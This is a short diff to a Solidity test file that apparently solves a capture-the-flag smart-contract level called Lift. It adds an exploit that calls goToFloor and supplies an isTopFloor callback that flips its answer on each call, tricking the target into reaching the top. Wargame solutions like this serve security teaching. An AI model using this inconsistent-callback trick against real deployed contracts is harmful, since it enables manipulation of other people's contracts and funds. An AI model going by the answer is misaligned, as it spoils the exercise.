@@ -16,12 +16,17 @@ contract LiftTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        instance.goToFloor(0);
 
         checkSuccess();
     }
 
     function checkSuccess() internal view override {
         assertTrue(instance.top(), "Solution is not solving the level");
+    }
+
+    function isTopFloor(uint256) public returns (bool) {
+        isTop = !isTop;
+        return isTop;
     }
 }
